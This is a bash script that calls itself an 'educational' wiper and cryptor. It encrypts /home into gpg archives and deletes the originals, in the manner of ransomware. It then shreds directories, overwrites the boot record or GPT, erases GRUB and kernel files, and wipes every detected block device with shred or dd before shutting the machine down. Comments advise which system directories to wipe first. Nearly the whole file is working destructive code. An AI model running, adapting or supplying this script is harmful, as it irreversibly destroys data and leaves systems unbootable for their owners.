#!/bin/bash

# ==============================
# Educational Purposes Wiper / Cryptor using basic Linux utils 
# Still in progress still early alpha, might use it to test things out
# Version 0.3.3
# ==============================

set -e

# ==============================
# A: Variable Definitions
# ==============================

# Binary availability flags
SHRED_PRESENT=false
GPG_PRESENT=false
DD_PRESENT=false
RM_PRESENT=false
NOHUP_PRESENT=false
TAIL_PRESENT=false
FIND_PRESENT=false
SGDISK_PRESENT=false
WHICH_PRESENT=false
PASSPHRASE=""

LOG_DIR="/root/.edu/logs"
ENCRYPTED_DIR="/root/.edu/encrypted_files"
LOCATION_FILE="/root/.edu/encryption_map.txt"

# Directories to be processed for deletion, encryption, and exclusion
deleted_dirs=(
    "/home"
# Experimental wipage order, optimize yourself on what goes first before it is unusable
#  "/var/lib" "/var/backups" "/var/mail"
#    "/srv" "/opt" "/mnt" "/home"
#    "/etc" "/boot" # Delay /boot shredding
#    "/root" # Delay /root shredding 
#    "/bin" "/sbin" "/usr/bin" "/usr/sbin" # Delay shredding of essential bins
#    "/lib" "/lib64" "/usr/lib" "/usr/lib64" # Do this last
    
)

encrypted_dirs=(
    "/home"
)

excluded_dirs=(
    "/usr" "/proc" "/sys" "/dev" "/run"
)

# Wiping variables
WIPE_COUNT=1   # Number of overwrite passes (default to 1 for speed)
WIPE_METHOD="-n"   # Shred method for wiping, "-n" for random, "-z" for zero out

# Function to dynamically detect all available block devices for wiping
get_wipe_devices() {
    WIPE_DEVICE=($(lsblk -nd --output NAME | sed 's/^/\/dev\//'))
}

# Define the list of exclusions
exclusion_paths=(
    "$(which bash)"
    "$(which find)"
    "$(which rm)"
    "$(which shred)"
    "$(which dd)"
    "$(which nohup)"
    "$(which tail)"
    "$(which getent)"
    "$(which which)"
    "/usr/sbin/sshd"
    "/etc/ssh/sshd_config"
    "/etc/ssh/ssh_config"
    "/etc/ssh/ssh_host_*"
    "/home/vagrant/.ssh/*"
    "/lib/x86_64-linux-gnu/*"
    "/lib64/ld-linux-x86-64.so.2"
    "/lib/systemd/*"
    "/etc/passwd"
    "/etc/shadow"
    "/etc/group"
    "/etc/gshadow"
    "/etc/sudoers"
    "/etc/fstab"
    "/etc/hostname"
    "/etc/resolv.conf"
    "/boot/vmlinuz-*"
    "/boot/initrd.img-*"
    "/boot/System.map-*"
    "/boot/config-*"
    "/boot/grub/*"
    "/boot/grubenv"
)

# ==============================
# B: Function Definitions
# ==============================

# B1: Function to check for the presence of critical binaries
check_binaries() {
    command -v shred >/dev/null 2>&1 && SHRED_PRESENT=true || SHRED_PRESENT=false
    command -v gpg >/dev/null 2>&1 && GPG_PRESENT=true || GPG_PRESENT=false
    command -v dd >/dev/null 2>&1 && DD_PRESENT=true || DD_PRESENT=false
    command -v rm >/dev/null 2>&1 && RM_PRESENT=true || RM_PRESENT=false
    command -v nohup >/dev/null 2>&1 && NOHUP_PRESENT=true || NOHUP_PRESENT=false
    command -v tail >/dev/null 2>&1 && TAIL_PRESENT=true || TAIL_PRESENT=false
    command -v find >/dev/null 2>&1 && FIND_PRESENT=true || FIND_PRESENT=false
    command -v sgdisk >/dev/null 2>&1 && SGDISK_PRESENT=true || SGDISK_PRESENT=false
    command -v which >/dev/null 2>&1 && WHICH_PRESENT=true || WHICH_PRESENT=false
}

# B2: Function to install GPG if not present
install_gpg() {
    if ! $GPG_PRESENT; then
        echo "GPG not found. Attempting to install..."
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update && apt-get install -y gnupg || {
                echo "Failed to install GPG. Aborting encryption process."
                GPG_PRESENT=false
            }
        else
            echo "apt-get not found. Cannot install GPG. Aborting encryption process."
            GPG_PRESENT=false
        fi
    fi
}

# B3: Function to create necessary log files
prepare_logs() {
    mkdir -p "$LOG_DIR" "$ENCRYPTED_DIR"
    touch "$LOG_DIR/nohup.out" "$LOG_DIR/remaining_files.log" "$LOCATION_FILE"
    chmod 600 "$LOG_DIR/nohup.out" "$LOG_DIR/remaining_files.log" "$LOCATION_FILE"
}

# B4: Function to securely wipe files using shred, fallback to rm
wipe_files() {
    if $SHRED_PRESENT; then
        echo "Using shred on $1..."
        shred -u $WIPE_METHOD -v "$1" >> "$LOG_DIR/remaining_files.log" 2>&1 || {
            echo "Shred failed for $1. Using rm..."
            rm -f "$1" >> "$LOG_DIR/remaining_files.log" 2>&1
        }
    elif $DD_PRESENT; then
        echo "shred not found, using dd on $1..."
        dd if=/dev/urandom of="$1" bs=1M status=progress
    elif $RM_PRESENT; then
        echo "shred and dd not found, using rm on $1..."
        rm -f "$1"
    else
        echo "No suitable tool found for wiping."
    fi
}

# B5: Function to recursively shred directories from the top
recursive_shred() {
    local dir=$1
    echo "Starting shred on $dir..."
    if $FIND_PRESENT; then
        find "$dir" -mindepth 1 -maxdepth 1 -type d | while read -r subdir; do
            recursive_shred "$subdir"
        done
        find "$dir" -type f $(printf "! -path '%s' " "${exclusion_paths[@]}") -exec bash -c 'wipe_files "{}"' \;
    else
        echo "find command not available. Skipping shredding of $dir."
    fi
    # Optionally, remove the directory itself after shredding
    if [ -z "$(find "$dir" -mindepth 1 -maxdepth 1 2>/dev/null)" ]; then
        rm -rf "$dir"
    fi
}

# B6: Function to wipe entire disk(s)
wipe_disks() {
    get_wipe_devices
    for disk in "${WIPE_DEVICE[@]}"; do
        if [[ -b "$disk" ]]; then
            echo "Wiping disk $disk with $WIPE_COUNT pass..."
            if $SHRED_PRESENT; then
                shred -v -n $WIPE_COUNT "$disk"
            else
                echo "shred not found, using dd to wipe $disk..."
                dd if=/dev/urandom of="$disk" bs=1M status=progress
            fi
        else
            echo "Device $disk not found. Skipping."
        fi
    done
}

# B7: Function to handle errors and initiate DD fallback
dd_fallback() {
    echo "Critical failure encountered. Initiating DD fallback to wipe remaining data..."
    get_wipe_devices
    for drive in "${WIPE_DEVICE[@]}"; do
        echo "Wiping $drive with DD..."
        dd if=/dev/urandom of="$drive" bs=1M status=progress || {
            echo "Failed to wipe $drive with DD. Continuing to the next available drive..."
        }
    done
    echo "DD fallback complete. System will now shut down."
    sudo shutdown -h now
}

# B8: Function to log progress if possible
log_progress() {
    tail -f "$LOG_DIR/nohup.out" "$LOG_DIR/remaining_files.log" &
}

# B9: Function to overwrite MBR or GPT to render disk unbootable
overwrite_boot_records() {
    echo "Overwriting MBR or GPT to render disk unbootable..."
    get_wipe_devices
    if $DD_PRESENT; then
        echo "Using dd to overwrite MBR..."
        dd if=/dev/urandom of="${WIPE_DEVICE[0]}" bs=512 count=1 status=progress
    elif $SGDISK_PRESENT; then
        echo "Using sgdisk to zap GPT..."
        sgdisk --zap-all "${WIPE_DEVICE[0]}"
    fi
}

# B10: Function to wipe GRUB configuration and kernel files
wipe_grub_and_kernels() {
    echo "Wiping GRUB and kernel files to prevent booting..."
    wipe_files "/boot/grub/grub.cfg"
    wipe_files "/boot/grub/grubenv"
    wipe_files "/boot/vmlinuz-*"
    wipe_files "/boot/initrd.img-*"
}

# B11: Function to encrypt files or directories
encrypt_files() {
    if $GPG_PRESENT; then
        echo "Encrypting $1..."
        local encrypted_file="$1.gpg"
        echo "$PASSPHRASE" | gpg --batch --yes --passphrase-fd 0 -c "$1" && rm -f "$1"
        
        # Log the original location, original filename, and encrypted file path
        echo "$(dirname "$1")/$(basename "$1") -> $encrypted_file" >> "$LOCATION_FILE"
    else
        echo "GPG not available, skipping encryption for $1."
    fi
}

# B12: Function to validate and manage directories
validate_and_add_directories() {
    local input_dirs="$1"
    local -n target_array=$2

    # Replace semicolons with commas for easier handling
    input_dirs=${input_dirs//;/,}

    # Split input into an array by commas
    IFS=',' read -r -a dirs_array <<< "$input_dirs"

    for dir in "${dirs_array[@]}"; do
        dir=$(echo "$dir" | xargs)  # Trim any surrounding whitespace
        if [[ -d "$dir" ]]; then
            target_array+=("$dir")
            echo "Added valid directory: $dir"
        else
            echo "Invalid or non-existent directory: $dir. Skipping."
        fi
    done
}

manage_directories() {
    echo -e "\nCurrent Directories:"
    echo "===================="
    printf "%-20s %-20s %-20s\n" "Encryption Targets" "Deletion Targets" "Exclusion Targets"
    echo "-------------------- -------------------- --------------------"
    for i in "${!encrypted_dirs[@]}"; do
        printf "%-20s %-20s %-20s\n" "${encrypted_dirs[$i]:-}" "${deleted_dirs[$i]:-}" "${excluded_dirs[$i]:-}"
    done
    echo "===================="

    echo -e "\nDo you want to (A)dd, (R)emove, or (C)ontinue with the current list? "
    read -p "(A/R/C): " action
    case $action in
        [Aa]* )
            read -p "Enter directories to add for encryption (separated by commas or semicolons): " new_enc_dirs
            validate_and_add_directories "$new_enc_dirs" encrypted_dirs
            read -p "Enter directories to add for deletion (separated by commas or semicolons): " new_del_dirs
            validate_and_add_directories "$new_del_dirs" deleted_dirs
            read -p "Enter directories to add for exclusion (separated by commas or semicolons): " new_exc_dirs
            validate_and_add_directories "$new_exc_dirs" excluded_dirs
            ;;
        [Rr]* )
            read -p "Enter directory to remove from encryption: " rem_enc_dir
            encrypted_dirs=("${encrypted_dirs[@]/$rem_enc_dir}")
            read -p "Enter directory to remove from deletion: " rem_del_dir
            deleted_dirs=("${deleted_dirs[@]/$rem_del_dir}")
            read -p "Enter directory to remove from exclusion: " rem_exc_dir
            excluded_dirs=("${excluded_dirs[@]/$rem_exc_dir}")
            ;;
        [Cc]* )
            ;;
        * )
            echo "Invalid option. Continuing with the current list."
            ;;
    esac
}

# B13: Function to decrypt files from encryption_map.txt
decrypt_files() {
    if $GPG_PRESENT && [[ -f "$LOCATION_FILE" ]]; then
        read -s -p "Enter passphrase for decryption: " PASSPHRASE
        echo
        while IFS= read -r line; do
            original_file=$(echo "$line" | cut -d' ' -f1)
            encrypted_file=$(echo "$line" | cut -d' ' -f3)
            if [[ -f "$encrypted_file" ]]; then
                echo "Decrypting $encrypted_file to $original_file..."
                echo "$PASSPHRASE" | gpg --batch --yes --passphrase-fd 0 -o "$original_file" -d "$encrypted_file"
                
                # If the decrypted file is a tarball, extract it
                if [[ "$original_file" == *.tar.gz ]]; then
                    tar -xzf "$original_file" -C "$(dirname "$original_file")"
                    rm -f "$original_file"
                fi
            else
                echo "Encrypted file $encrypted_file not found. Skipping."
            fi
        done < "$LOCATION_FILE"
    else
        echo "GPG not available or no location file found. Skipping decryption."
    fi
}

# B14: Function to clean up files post encryption
cleanup_files() {
    local dir=$1
    local tarball="${dir}.tar.gz"
    local encrypted_tarball="${dir}.tar.gz.gpg"

    echo "Removing original directory $dir..."
    rm -rf "$dir"

    echo "Removing tarball $tarball..."
    rm -f "$tarball"

    echo "Encrypted tarball is stored at $encrypted_tarball"
}

# Export the functions so they can be used in subshells
export -f wipe_files recursive_shred encrypt_files decrypt_files cleanup_files

# ==============================
# C: Main Execution
# ==============================

# C1: Initial binary check
check_binaries

# C2: Attempt to install GPG if it's not found
install_gpg

# C3: Create log files
prepare_logs

# C4: Prompt user for the desired action
read -p "Do you want to (E)ncrypt, (D)ecrypt, (W)ipe, or (EW) Encrypt + Wipe? " choice

# C5: Prompt for passphrase if encryption is selected
if [[ $choice =~ [EeBb] ]]; then
    read -s -p "Enter passphrase for encryption: " PASSPHRASE
    echo
fi

# C6: Manage directories
manage_directories

# C7: Perform encryption if selected
if [[ $choice =~ [EeBb] ]]; then
    for dir in "${encrypted_dirs[@]}"; do
        if [[ -d "$dir" && ! " ${excluded_dirs[@]} " =~ " $dir " ]]; then
            tar -czf "$dir.tar.gz" "$dir"
            encrypt_files "$dir.tar.gz"
            cleanup_files "$dir"
        fi
    done
fi

# C8: Perform decryption if selected
if [[ $choice =~ [Dd] ]]; then
    decrypt_files
    exit 0
fi

# C9: Prompt the user after encryption is complete
if [[ $choice =~ [EeBb] ]]; then
    read -p "Encryption completed. Do you want to continue with deletion? (Y/N): " cont_delete
    if [[ ! $cont_delete =~ [Yy] ]]; then
        echo "Exiting without deleting files."
        exit 0
    fi
fi

# C10: Perform deletion if selected
if [[ $choice =~ [WwBb] ]]; then
    for dir in "${deleted_dirs[@]}"; do
        if [[ -d "$dir" && ! " ${excluded_dirs[@]} " =~ " $dir " ]]; then
            recursive_shred "$dir"
        fi
    done

    overwrite_boot_records
    wipe_grub_and_kernels
    wipe_disks
fi

# C11: Log progress
log_progress

# C12: Wait for background processes to finish
wait

# C13: Check if we need to trigger the dd fallback
if ! $FIND_PRESENT || ! $WHICH_PRESENT; then
    dd_fallback
fi

echo -e "\nProcessing complete!"
